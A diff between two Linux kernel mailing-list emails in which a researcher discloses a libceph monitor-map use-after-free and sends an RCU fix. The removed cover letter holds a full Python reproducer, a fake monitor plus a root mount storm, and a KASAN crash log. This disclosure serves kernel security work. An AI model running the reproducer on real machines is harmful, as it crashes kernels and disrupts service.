@@ -1,70 +1,78 @@
-Received: from mail-pf1-f182.google.com (mail-pf1-f182.google.com [209.85.210.182])
+Received: from mail-pf1-f174.google.com (mail-pf1-f174.google.com [209.85.210.174])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A435426ADC
-	for <ceph-devel@vger.kernel.org>; Wed,  8 Jul 2026 03:03:53 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.182
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A818726ADC
+	for <ceph-devel@vger.kernel.org>; Wed,  8 Jul 2026 03:04:00 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.210.174
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1783479835; cv=none; b=eU4MhAHSyd7T8ECmOGIR81RJnzcoyDTw7kK7nlx6Og+dTEx2v+f8JvPV6cNeqQjurFI/7M7ZZEtnEVxOdD1lSOFG10P8zCGiAX1n/bXWAeEoGm+Q2yPo1dZ8Nn5b6Bsp22mUa0STB5hLQiXmZD07My1M5/HV2D13pJn7SgkMFGY=
+	t=1783479842; cv=none; b=VRG0WwWChchEy7TEFKi+9BT8mdycEy6vDSrUPVAeEN9zX+w+G9Y19Tj2mBHGI4aWZo4GYUjadxhRGeu+8CEHH27B/Tr6bXCe1WiEywcQjKUODvIVaP1+oC2733TXUa3yZ2uAxoI5zldgv4ICXhGGnhkHm5Er24Kpt8s9SalKa7Y=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1783479835; c=relaxed/simple;
-	bh=tg/9ayt8dNQHHx0QzLlCeb+BIluJKHoo0CWJ8hYB13A=;
-	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=GQBVR92DjZL1mQciUJMKuzZKRhJHEClVfZ3rLDnQpKX91tDUPhWJbEXxwb00IPqOZAv8wtflVQVB9VUiqRMCX0EgGt43kSdROb3W3Fg2emFEztnoMmyeZEqPAUvct4LqHBjuOnCUdsD3FRpn99RMahxngOYbsZ/U8LayR5gDfnk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=eq6+jGj1; arc=none smtp.client-ip=209.85.210.182
+	s=arc-20240116; t=1783479842; c=relaxed/simple;
+	bh=qmyy1BwSfWnAZ4LljYmC4wDZq2scKHqYZb0nEdhJOdE=;
+	h=From:To:Cc:Subject:Date:Message-ID:In-Reply-To:References:
+	 MIME-Version; b=b3bJHA2UfRrknPdXSLEWigXPDZnDnuySO0R5GZ2700ajFCEokRj+02fdY2bLAi/BDMdIgD7r/Pd/lZi75VOt3+ZK3AhniSiV4RLXCAH+c6FL5nX9quPOfpQSWVZIOaD97nakNfcmm6TrSWIjTd31fk6hRRNxHHig9MQ4DQeH44A=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=StSn50zu; arc=none smtp.client-ip=209.85.210.174
 Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="eq6+jGj1"
-Received: by mail-pf1-f182.google.com with SMTP id d2e1a72fcca58-84794e800f4so114960b3a.0
-        for <ceph-devel@vger.kernel.org>; Tue, 07 Jul 2026 20:03:53 -0700 (PDT)
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="StSn50zu"
+Received: by mail-pf1-f174.google.com with SMTP id d2e1a72fcca58-847a69ba83dso158633b3a.2
+        for <ceph-devel@vger.kernel.org>; Tue, 07 Jul 2026 20:04:00 -0700 (PDT)
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20251104; t=1783479833; x=1784084633; darn=vger.kernel.org;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
-        bh=qGlbH/1W30ijTXCz61IVnEDsVyLcmlTLzyLWvLDxVw4=;
-        b=eq6+jGj1TUURbhlgNfvq1Az3TGikdXH1G5ntJ37+tKpSkLqgRPfwYuO7OLWWG+ixdi
-         IEND7XuwZtxd29pA910zK5Li+Ro8icr6v6mkDtrLU304ShVw2fsZ7OLUX9m4Is2aCnzG
-         Lmpcwe1X8KUmceBaqi/JWeYDazuM09lbSfailHZn2XlouLzvwQhoC1fzY2MHGel4HRA9
-         ndTEcKI2T+nHiutXdAqsRELZgIOHYZEmDL9+fQrMMIyWTv+rbk8q7vTZN15A1jfMclyq
-         6xccAC5a/1gItEBnW0JLLWuYVO0iy3burkL5MYqRd7NHKCjx5yyOALpXHIoU0pl0Yeay
-         fleA==
+        d=gmail.com; s=20251104; t=1783479840; x=1784084640; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=dvlhzeJPauWp4CMwFWRivJ96GmY7MOSFiH7l8oDt9XU=;
+        b=StSn50zuKVtbOK6P3aFyyWxI9Mj8JnXFypUJ7kWFD4xH9ebLNwZlkOQ1PNA4eKwkOT
+         gf2GR9ElDWBdY0k2w8L7tscwOxImVpf8excmft8x/YOm6NZ1chiJ6yeu0x5UbpEeRY0w
+         /lmhs+nYAGhAn23bGhet5SCI2QQ/G1e2XNpgbbnYZ8s9Y6SV4CUsiJkAfVAx5zCBlNCn
+         Z2Y3onp0AX3KAW66/AxUJsd5nVWQ+9Fi2UsTJg/tdwcLrvzW7PxOw0KE1+EbYi2OHT58
+         laHRl8Dk9egTGg5Dog4BV8+12sdr/xRiZcmoX75nkhSeDiyoZ1U3+xmCPIoFCDEjz/P+
+         ruqQ==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1783479833; x=1784084633;
-        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
-         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=qGlbH/1W30ijTXCz61IVnEDsVyLcmlTLzyLWvLDxVw4=;
-        b=k0VbRDaRIFOI/1pBmFPRtq02HNN9e+xGlBoZLaGerIhAgvJYpSkR9/0rGrewXc9hov
-         AJ+L4CTel51gyzU8W1VgojWfHeqyF8hD7ggpbAv/eHamj3vOiw8DdmJktDa//ryxWQbO
-         KwPONblIg5ZUo53u7VcZfxP1zbd+2xcsLgA70QoFwdYnnMhgfnMaNgGsmby6N8WujOHm
-         NUDPCcAyINONHI24Vgn6JooEw3nT8W7BhLjQlLFERYpe3ewNFCIdOl1QCQBbrxQGQk+H
-         KDLdeEaTHVZIpKhxKrCXtpinIEBMuaAKO0Uy64vy+2uZWM+CdovyVwpFrbYFvCCLnI0w
-         kKPg==
-X-Gm-Message-State: AOJu0YzMOck5AAp/PYuAtGi99gjdbcrZtoqTRqb3XG7ALJqaxjMr6tZs
-	4LojXCn/5u4FyBWESdFxiUeNLyln22X3AxmmNu9W6IE3XnKe/T0eZZGWEpT1MViQ
-X-Gm-Gg: AfdE7cm2UN/LPClTnRKL9BZdwugBvA2fDsbojNgGmt158hGyuvi4vyA0+f1iZjjge6R
-	clF/nmekMAQskOH6TaU9kcLQcYTu4AUtToaDzKSpVvj9ltIPK53FTvk8wMX+Gquwe9/uxGgPUNe
-	n/U3SaKdcCRjETliae/jg9+azc4DlNKhXvBvyy/uG4TJnXK/d4E8mIQZM777SdzVPL8FPS1oXwV
-	79SCIfEU4P/DJroorvOhqD27HkfkruIdp5DFytpo/GsmLYMTEuO7zyQaQvsq8kP90L0mdX9wJV4
-	PUo2FOFsAS3wU3IaZkFFcbeh41rlc2lvHzLweQIyNmUvDBl4noGqM2bmn/J0Wix2r+ONOLubJvm
-	3PHGbq7qAiXGWNn51sIMAwOBxKfcBEZwXtLUfCzkt1l+cOqPmq5sQ0igNuon6X/ERzFTHnhjjFr
-	R8dYlfMMOnW29uRJA7sswmtPoYpeWn2zo=
-X-Received: by 2002:a05:6a00:4c88:b0:848:2f74:d8d4 with SMTP id d2e1a72fcca58-8484300062emr721184b3a.69.1783479832873;
-        Tue, 07 Jul 2026 20:03:52 -0700 (PDT)
+        d=1e100.net; s=20251104; t=1783479840; x=1784084640;
+        h=content-transfer-encoding:mime-version:references:in-reply-to
+         :message-id:date:subject:cc:to:from:x-gm-gg:x-gm-message-state:from
+         :to:cc:subject:date:message-id:reply-to;
+        bh=dvlhzeJPauWp4CMwFWRivJ96GmY7MOSFiH7l8oDt9XU=;
+        b=ez/Iy/Uso+IVgrpb0J2XKVQRTRqOj8Mdgb67mnleJ+pGDEwSVfHUhGGpkWErsd9K2h
+         y67877W0dcXpmtMPu/DrIjOCPnWrzliVWzY6cxOfNr4TqiQVqn2qPt6mIj5sXid43ugO
+         KYd6uHFr5TBFTD7fvMu3BEctXYf+Hym7YDArQ2oHVCEfCVCJnLtziSDjHjuRNxa1oaD1
+         BC79SxpMrUx6qYwn4n9X2AKzTelU25ANtl77FiVOiDdMPma/Soh6tElvSzfYFo9Z7m4b
+         0tbLCOXiykxtsUYyZrL5P5hdaIMYcBu20hhDJ1uJHd5w/tEiMnQTkRn0rPKaIB3z8o6N
+         NOug==
+X-Gm-Message-State: AOJu0YwTqX0vER/Gn9w9WKor8+NZd+oylzqnG0y7w1NKYtRceth6Evmj
+	84BEp1DZR7puLpiAhtnACHGnCd/7CNio8mY58iKaDRJ7oq3VKWNrmxeh1R+YOJOB
+X-Gm-Gg: AfdE7cnztHlPKwt6JcwIgzM+39IqI6OV6y1nu9bFtTvfD76QSIvI6S/Jij7HmnqKxXL
+	lw1ZMIeNC8kvTUepOvHVzZIASFZXEvidDWdWKvycXGs6mznMEyPjU6CRp22LsBBNheO3jkn6LF8
+	+FN1C57YuOyCM8fxTf8bHCYIoTKBrPUCjN50quopT/PmXjpdtxA6JdKsvttv3UiAzHoGX5cPOrt
+	S2su0JtQNoSNKdV/mhsJtjJ47RCUxeUCGamfwdWjINegDlDJRuVRuaGrUPF1dV9BZyyyXcZWmTp
+	G6LjbktV3m1uMqzJLz2msNcUyk+QQyPFjG/vCEdWaLVeCT20n+PhToJzWJgpIvCfIKgsp+OurK6
+	r252fPXLFq/mHgZTIchR2YFAKPOfbsPOZqS077UcOZCXwL2GUfLXWxPOshgzRThK2A6C056NtHf
+	8an3rgo+VNsax7uYYIo+j5w4nL9Ky1rOrIDip2XfqLcw==
+X-Received: by 2002:a05:6a00:8c4:b0:848:2f6e:e52f with SMTP id d2e1a72fcca58-84843031caamr799151b3a.67.1783479839835;
+        Tue, 07 Jul 2026 20:03:59 -0700 (PDT)
 Received: from enjou-Legion-Y7000P-2019 ([123.114.53.210])
-        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-847f6b609acsm6175745b3a.1.2026.07.07.20.03.50
+        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-847f6b609acsm6175745b3a.1.2026.07.07.20.03.57
         (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Tue, 07 Jul 2026 20:03:52 -0700 (PDT)
+        Tue, 07 Jul 2026 20:03:59 -0700 (PDT)
 From: Ren Wei <enjou1224z@gmail.com>
 To: ceph-devel@vger.kernel.org
-Cc: yuantan098@gmail.com,
+Cc: idryomov@gmail.com,
+	amarkuze@redhat.com,
+	slava@dubeyko.com,
+	sage@newdream.net,
+	yuantan098@gmail.com,
 	dstsmallbird@foxmail.com,
 	edragain@163.com,
 	enjou1224z@gmail.com
-Subject: [PATCH 0/1] libceph: fix a monmap use-after-free in ceph_compare_options()
-Date: Wed,  8 Jul 2026 11:03:40 +0800
-Message-ID: <cover.1783423648.git.edragain@163.com>
+Subject: [PATCH 1/1] libceph: use RCU to protect monmap in ceph_compare_options()
+Date: Wed,  8 Jul 2026 11:03:41 +0800
+Message-ID: <f9b8b94904378d14111606a3cfee801c60492681.1783423648.git.edragain@163.com>
 X-Mailer: git-send-email 2.51.0
+In-Reply-To: <cover.1783423648.git.edragain@163.com>
+References: <cover.1783423648.git.edragain@163.com>
 Precedence: bulk
 X-Mailing-List: ceph-devel@vger.kernel.org
 List-Id: <ceph-devel.vger.kernel.org>
@@ -75,588 +83,33 @@ Content-Transfer-Encoding: 8bit
 
 From: Yong Wang <edragain@163.com>
 
-Hi Linux kernel maintainers,
-
-We found and validated a use-after-free in net/ceph/ceph_common.c.
-The bug is reachable by root via the normal CephFS mount path.
-We tested the fix and it does not change the existing non-blocking
-mount-share comparison semantics.
-
-We provide the technical details, the reproducer that triggers the bug
-and the crash log below.
-
----- details below ----
-
-Bug details:
-
-ceph_compare_options() determines whether a new mount can share an
-existing client by checking whether any monitor address in the new
-mount options is present in client->monc.monmap:
-
-	for (i = 0; i < opt1->num_mon; i++) {
-		if (ceph_monmap_contains(client->monc.monmap,
-					 &opt1->mon_addr[i]))
-			return 0;
-	}
-
-That path runs from ceph_compare_super() during shared mount lookup.
-It can execute under sb_lock or rbd_client_list_lock, so it cannot
-take monc->mutex.
-
-Monitor map updates, however, replace monc->monmap under monc->mutex
-and free the old map immediately:
-
-	mutex_lock(&monc->mutex);
-	...
-	kfree(monc->monmap);
-	monc->monmap = monmap;
-
-ceph_monmap_contains() then walks m->num_mon and m->mon_inst[] on a
-monmap object whose lifetime is not protected against concurrent
-replacement.  A shared-mount comparison racing a monmap update can
-therefore dereference a freed struct ceph_monmap and walk stale
-mon_inst[] entries, leading to a slab-use-after-free.
-
-The attached patch fixes this by protecting the compare path with RCU
-and by publishing/freeing monitor maps with rcu_assign_pointer() and
-kfree_rcu().
-
-Reproducer:
-
-We ran the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
-
-exec python3 "poc.py" \
-  --ssh-port "$QEMU_SSH_PORT" \
-  --monitor-port "6789" \
-  --workers "16" \
-  --duration "5" \
-  --attempts "10" \
-  --update-interval "0.0005"
-
-------BEGIN poc.py------
-#!/usr/bin/env python3
-import argparse
-import os
-import shlex
-import socket
-import struct
-import subprocess
-import sys
-import threading
-import time
-
-POLY = 0x82F63B78
-BANNER = b"ceph v027"
-BANNER_ADDR = b"\x00" * 136
-FSID = bytes.fromhex("11223344556677889900aabbccddeeff")
-
-TAG_READY = 1
-TAG_MSG = 7
-TAG_ACK = 8
-TAG_KEEPALIVE = 9
-TAG_KEEPALIVE2 = 14
-TAG_KEEPALIVE2_ACK = 15
-TAG_CLOSE = 6
-
-MSG_MON_MAP = 4
-MSG_MON_SUBSCRIBE = 15
-MSG_MON_SUBSCRIBE_ACK = 16
-MSG_AUTH = 17
-MSG_AUTH_REPLY = 18
-
-NUM_MON = 31
-
-
-def crc32c(data, seed=0):
-    crc = seed & 0xFFFFFFFF
-    for b in data:
-        crc ^= b
-        for _ in range(8):
-            if crc & 1:
-                crc = (crc >> 1) ^ POLY
-            else:
-                crc >>= 1
-            crc &= 0xFFFFFFFF
-    return crc
-
-
-def recv_exact(sock, length):
-    data = b""
-    while len(data) < length:
-        chunk = sock.recv(length - len(data))
-        if not chunk:
-            raise EOFError("peer closed")
-        data += chunk
-    return data
-
-
-def pack_header(seq, tid, msg_type, front_len):
-    hdr = b""
-    hdr += struct.pack("<Q", seq)
-    hdr += struct.pack("<Q", tid)
-    hdr += struct.pack("<H", msg_type)
-    hdr += struct.pack("<H", 127)
-    hdr += struct.pack("<H", 0)
-    hdr += struct.pack("<I", front_len)
-    hdr += struct.pack("<I", 0)
-    hdr += struct.pack("<I", 0)
-    hdr += struct.pack("<H", 0)
-    hdr += struct.pack("<B", 1)
-    hdr += struct.pack("<Q", 0)
-    hdr += struct.pack("<H", 0)
-    hdr += struct.pack("<H", 0)
-    hdr += struct.pack("<I", crc32c(hdr))
-    return hdr
-
-
-def pack_msg(seq, tid, msg_type, front):
-    hdr = pack_header(seq, tid, msg_type, len(front))
-    footer = struct.pack("<IIIQb", crc32c(front), 0, 0, 0, 1)
-    return bytes([TAG_MSG]) + hdr + front + footer
-
-
-def parse_msg_header(hdr):
-    return {
-        "seq": struct.unpack_from("<Q", hdr, 0)[0],
-        "tid": struct.unpack_from("<Q", hdr, 8)[0],
-        "type": struct.unpack_from("<H", hdr, 16)[0],
-        "front_len": struct.unpack_from("<I", hdr, 22)[0],
-        "middle_len": struct.unpack_from("<I", hdr, 26)[0],
-        "data_len": struct.unpack_from("<I", hdr, 30)[0],
-    }
-
-
-def enc_addr(ip, port):
-    ip_bytes = socket.inet_aton(ip)
-    sockaddr = struct.pack("<H", socket.AF_INET)
-    sockaddr += struct.pack(">H", port)
-    sockaddr += ip_bytes
-    sockaddr += b"\x00" * 8
-
-    addr_struct = b""
-    addr_struct += struct.pack("<B", 1)
-    addr_struct += struct.pack("<BBI", 1, 1, 12 + len(sockaddr))
-    addr_struct += struct.pack("<I", 1)
-    addr_struct += struct.pack("<I", 0)
-    addr_struct += struct.pack("<I", len(sockaddr))
-    addr_struct += sockaddr
-    return addr_struct
-
-
-def enc_monmap(epoch):
-    body = FSID
-    body += struct.pack("<I", epoch)
-    body += struct.pack("<I", NUM_MON)
-
-    for i in range(NUM_MON):
-        name = f"m{i}".encode()
-        body += struct.pack("<I", len(name))
-        body += name
-        body += enc_addr("10.0.2.123", 7000 + i)
-
-    blob = struct.pack("<BBI", 5, 5, len(body)) + body
-    return struct.pack("<I", len(blob)) + blob
-
-
-class ConnWorker(threading.Thread):
-    def __init__(self, conn, stop_event, update_interval):
-        super().__init__(daemon=True)
-        self.conn = conn
-        self.stop_event = stop_event
-        self.update_interval = update_interval
-        self.seq = 0
-        self.epoch = 0
-        self.subscribed = False
-        self.error = ""
-
-    def send_msg(self, tid, msg_type, front):
-        self.seq += 1
-        self.conn.sendall(pack_msg(self.seq, tid, msg_type, front))
-
-    def handle_handshake(self):
-        _ = recv_exact(self.conn, 9 + 136)
-        self.conn.sendall(BANNER + BANNER_ADDR + BANNER_ADDR)
-
-        cmsg = recv_exact(self.conn, 33)
-        features, _host_type, gseq, cseq, proto, _aproto, alen, _flags = struct.unpack(
-            "<QIIIIIIb", cmsg
-        )
-        if alen:
-            _ = recv_exact(self.conn, alen)
-
-        reply = struct.pack("<BQIIIIb", TAG_READY, features, gseq, cseq + 1, proto, 0, 0)
-        self.conn.sendall(reply)
-        self.conn.settimeout(0.001)
-
-    def handle_msg(self, hdr_info, front):
-        if hdr_info["type"] == MSG_AUTH:
-            auth_reply = struct.pack("<IIQI", 1, 0, 0x1234, 0) + struct.pack("<I", 0)
-            self.send_msg(hdr_info["tid"], MSG_AUTH_REPLY, auth_reply)
-            return
-
-        if hdr_info["type"] == MSG_MON_SUBSCRIBE:
-            self.subscribed = True
-            self.send_msg(hdr_info["tid"], MSG_MON_SUBSCRIBE_ACK, struct.pack("<I", 30) + FSID)
-            return
-
-    def run(self):
-        try:
-            self.handle_handshake()
-            next_update = time.time()
-
-            while not self.stop_event.is_set():
-                now = time.time()
-                if self.subscribed and now >= next_update:
-                    sent = 0
-                    while now >= next_update and sent < 4:
-                        self.epoch += 1
-                        self.send_msg(0, MSG_MON_MAP, enc_monmap(self.epoch))
-                        next_update += self.update_interval
-                        sent += 1
-                        now = time.time()
-
-                try:
-                    tag = self.conn.recv(1)
-                except socket.timeout:
-                    continue
-
-                if not tag:
-                    return
-
-                tag = tag[0]
-                if tag == TAG_KEEPALIVE2:
-                    stamp = recv_exact(self.conn, 8)
-                    self.conn.sendall(bytes([TAG_KEEPALIVE2_ACK]) + stamp)
-                    continue
-                if tag == TAG_KEEPALIVE:
-                    continue
-                if tag == TAG_ACK:
-                    _ = recv_exact(self.conn, 8)
-                    continue
-                if tag == TAG_CLOSE:
-                    return
-                if tag != TAG_MSG:
-                    continue
-
-                hdr = recv_exact(self.conn, 53)
-                hdr_info = parse_msg_header(hdr)
-                front = recv_exact(self.conn, hdr_info["front_len"])
-                if hdr_info["middle_len"]:
-                    _ = recv_exact(self.conn, hdr_info["middle_len"])
-                if hdr_info["data_len"]:
-                    _ = recv_exact(self.conn, hdr_info["data_len"])
-                _ = recv_exact(self.conn, 21)
-                self.handle_msg(hdr_info, front)
-        except Exception as exc:
-            self.error = str(exc)
-        finally:
-            try:
-                self.conn.close()
-            except OSError:
-                pass
-
-
-class FakeMonitor:
-    def __init__(self, port, update_interval):
-        self.port = port
-        self.update_interval = update_interval
-        self.stop_event = threading.Event()
-        self.server = None
-        self.accept_thread = None
-        self.workers = []
-        self.accept_errors = []
-
-    def start(self):
-        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        self.server.bind(("0.0.0.0", self.port))
-        self.server.listen(256)
-        self.server.settimeout(0.2)
-
-        self.accept_thread = threading.Thread(target=self.accept_loop, daemon=True)
-        self.accept_thread.start()
-
-    def accept_loop(self):
-        while not self.stop_event.is_set():
-            try:
-                conn, _addr = self.server.accept()
-            except socket.timeout:
-                continue
-            except OSError as exc:
-                if not self.stop_event.is_set():
-                    self.accept_errors.append(str(exc))
-                return
-
-            worker = ConnWorker(conn, self.stop_event, self.update_interval)
-            self.workers.append(worker)
-            worker.start()
-
-    def stop(self):
-        self.stop_event.set()
-        if self.server is not None:
-            try:
-                self.server.close()
-            except OSError:
-                pass
-        if self.accept_thread is not None:
-            self.accept_thread.join(timeout=1)
-        for worker in self.workers:
-            worker.join(timeout=1)
-
-    def stats(self):
-        subscribed = sum(1 for w in self.workers if w.subscribed)
-        max_epoch = max((w.epoch for w in self.workers), default=0)
-        return {
-            "connections": len(self.workers),
-            "subscribed": subscribed,
-            "max_epoch": max_epoch,
-            "errors": [w.error for w in self.workers if w.error] + self.accept_errors,
-        }
-
-
-class Repro:
-    def __init__(self, ssh_port, monitor_port, workers, duration, attempts, update_interval):
-        self.ssh_port = ssh_port
-        self.monitor_port = monitor_port
-        self.workers = workers
-        self.duration = duration
-        self.attempts = attempts
-        self.update_interval = update_interval
-        script_dir = os.path.dirname(os.path.abspath(__file__))
-        repo_root = os.path.abspath(os.path.join(script_dir, "..", "..", "..", ".."))
-        ssh_key = os.environ.get(
-            "QEMU_SSH_KEY",
-            os.path.join(repo_root, "kernel-image", "bullseye.id_rsa"),
-        )
-        self.ssh = [
-            "ssh",
-            "-i",
-            ssh_key,
-            "-o",
-            "StrictHostKeyChecking=no",
-            "-o",
-            "UserKnownHostsFile=/dev/null",
-            "-o",
-            "ConnectTimeout=5",
-            "-p",
-            str(self.ssh_port),
-            "root@localhost",
-        ]
-
-    def ssh_run(self, cmd, timeout=30):
-        return subprocess.run(
-            self.ssh + [cmd],
-            text=True,
-            capture_output=True,
-            timeout=timeout,
-        )
-
-    def ssh_popen(self, cmd):
-        return subprocess.Popen(
-            self.ssh + [cmd],
-            stdout=subprocess.PIPE,
-            stderr=subprocess.PIPE,
-            text=True,
-        )
-
-    def guest_reachable(self):
-        try:
-            result = self.ssh_run("true", timeout=8)
-        except subprocess.TimeoutExpired:
-            return False
-        return result.returncode == 0
-
-    def cleanup_guest(self):
-        cmd = (
-            "pkill -x mount >/dev/null 2>&1 || true; "
-            "pkill -x timeout >/dev/null 2>&1 || true; "
-            "umount -a -t ceph >/dev/null 2>&1 || true; "
-            "rm -rf /mnt/cephcmp; mkdir -p /mnt/cephcmp; "
-            "dmesg -c >/dev/null 2>&1 || true; "
-            "sysctl -w kernel.panic_on_warn=1 >/dev/null 2>&1 || true"
-        )
-        return self.ssh_run(cmd, timeout=30)
-
-    def mount_source(self):
-        mon = f"10.0.2.2:{self.monitor_port}"
-        return ",".join(mon for _ in range(NUM_MON)) + ":/"
-
-    def mount_opts(self):
-        return "name=admin,ms_mode=legacy,nocephx_sign_messages,mount_timeout=30"
-
-    def storm_cmd(self):
-        source = shlex.quote(self.mount_source())
-        opts = shlex.quote(self.mount_opts())
-        return (
-            "set -eu; "
-            "for i in $(seq 0 " + str(self.workers - 1) + "); do "
-            "mkdir -p /mnt/cephcmp/$i; "
-            "done; "
-            "end=$(( $(date +%s) + " + str(self.duration) + " )); "
-            "for i in $(seq 0 " + str(self.workers - 1) + "); do "
-            "(while [ $(date +%s) -lt $end ]; do "
-            "timeout --signal=TERM --kill-after=1 1 "
-            f"mount -i -t ceph {source} /mnt/cephcmp/$i -o {opts} >/dev/null 2>&1 || true; "
-            "umount -l /mnt/cephcmp/$i >/dev/null 2>&1 || true; "
-            "done) & "
-            "done; "
-            "wait"
-        )
-
-    def collect_dmesg(self):
-        try:
-            result = self.ssh_run("dmesg | tail -n 400", timeout=20)
-        except subprocess.TimeoutExpired as exc:
-            return f"dmesg timeout: {exc}", False
-        return result.stdout + result.stderr, result.returncode == 0
-
-    def run_attempt(self, attempt):
-        cleanup = self.cleanup_guest()
-        if cleanup.returncode != 0:
-            raise RuntimeError(f"guest cleanup failed:\n{cleanup.stdout}\n{cleanup.stderr}")
-
-        monitor = FakeMonitor(self.monitor_port, self.update_interval)
-        monitor.start()
-
-        print(f"[*] attempt {attempt}: starting mount storm with {self.workers} workers", flush=True)
-        storm = self.ssh_popen(self.storm_cmd())
-
-        time.sleep(self.duration + 2)
-
-        monitor.stop()
-
-        try:
-            storm.wait(timeout=10)
-        except subprocess.TimeoutExpired:
-            storm.kill()
-            storm.wait(timeout=5)
-
-        stats = monitor.stats()
-        print(
-            f"[*] attempt {attempt}: connections={stats['connections']} subscribed={stats['subscribed']} max_epoch={stats['max_epoch']}",
-            flush=True,
-        )
-        for err in stats["errors"][:8]:
-            print(f"[i] server error: {err}", flush=True)
-
-        reachable = self.guest_reachable()
-        dmesg, got_dmesg = self.collect_dmesg() if reachable else ("guest unreachable after run", False)
-
-        hit = False
-        if got_dmesg:
-            print(dmesg, flush=True)
-            log = dmesg.lower()
-            hit = (
-                "kasan: slab-use-after-free" in log
-                or "kasan: use-after-free" in log
-                or "ceph_compare_options" in log
-                or "ceph_monmap_contains" in log
-                or "kernel panic - not syncing" in log
-            )
-        elif not reachable and stats["subscribed"] > 0 and stats["max_epoch"] > 10:
-            hit = True
-            print("[+] guest became unreachable after repeated monmap churn", flush=True)
-
-        self.cleanup_guest()
-        return hit
-
-    def run(self):
-        for attempt in range(1, self.attempts + 1):
-            if self.run_attempt(attempt):
-                return 0
-        return 1
-
-
-def main():
-    parser = argparse.ArgumentParser(description="Trigger ceph_compare_options UAF with a fake monitor")
-    parser.add_argument("--ssh-port", type=int, required=True, help="QEMU SSH port")
-    parser.add_argument("--monitor-port", type=int, default=6789, help="Host fake monitor port")
-    parser.add_argument("--workers", type=int, default=16, help="Concurrent guest mount workers")
-    parser.add_argument("--duration", type=int, default=5, help="Per-attempt runtime in seconds")
-    parser.add_argument("--attempts", type=int, default=10, help="Number of attempts")
-    parser.add_argument(
-        "--update-interval",
-        type=float,
-        default=0.0005,
-        help="Seconds between monmap updates per subscribed client",
-    )
-    args = parser.parse_args()
-
-    repro = Repro(
-        ssh_port=args.ssh_port,
-        monitor_port=args.monitor_port,
-        workers=args.workers,
-        duration=args.duration,
-        attempts=args.attempts,
-        update_interval=args.update_interval,
-    )
-    return repro.run()
-
-
-if __name__ == "__main__":
-    sys.exit(main())
-
-------END poc.py--------
-
-----BEGIN crash log----
-
-[  227.669089][ T9575] libceph: mon8 (1)10.0.2.2:6789 session established
-[  227.953134][   T26] libceph: mon30 (1)10.0.2.2:6789 session established
-[  227.978738][T10215] ==================================================================
-[  227.979344][T10215] BUG: KASAN: slab-use-after-free in ceph_monmap_contains+0x1e4/0x220
-[  227.980082][T10215] Read of size 4 at addr ffff888045132014 by task mount/10215
-[  227.980588][T10215]
-[  227.980818][T10215] CPU: 0 UID: 0 PID: 10215 Comm: mount Not tainted 6.12.74 #1
-[  227.980859][T10215] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
-[  227.980884][T10215] Call Trace:
-[  227.980901][T10215]  <TASK>
-[  227.980911][T10215]  dump_stack_lvl+0x10e/0x1f0
-[  227.981009][T10215]  print_report+0xc6/0x620
-[  227.981338][T10215]  kasan_report+0xd8/0x110
-[  227.981423][T10215]  ceph_monmap_contains+0x1e4/0x220
-[  227.981474][T10215]  ceph_compare_options+0x591/0x700
-[  227.981589][T10215]  ceph_compare_super+0x487/0xba0
-[  227.981699][T10215]  sget_fc+0x51e/0xc10
-[  227.982181][T10215]  ceph_get_tree+0x6e7/0x1e20
-[  227.982379][T10215]  path_mount+0x6cc/0x1fd0
-[  227.982639][T10215]  __x64_sys_mount+0x294/0x320
-[  227.982738][T10215]  do_syscall_64+0xc7/0x250
-[  227.982811][T10215]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-[  227.983093][T10215]  </TASK>
-[  228.003473][T10215] Allocated by task 9575:
-[  228.005659][T10215]  mon_dispatch+0x1906/0x2630
-[  228.006129][T10215]  ceph_con_process_message+0x208/0x640
-[  228.007264][T10215]  ceph_con_workfn+0x95a/0x11e0
-[  228.009862][T10215]
-[  228.010065][T10215] Freed by task 9575:
-[  228.012555][T10215]  mon_dispatch+0x1aa4/0x2630
-[  228.013032][T10215]  ceph_con_process_message+0x208/0x640
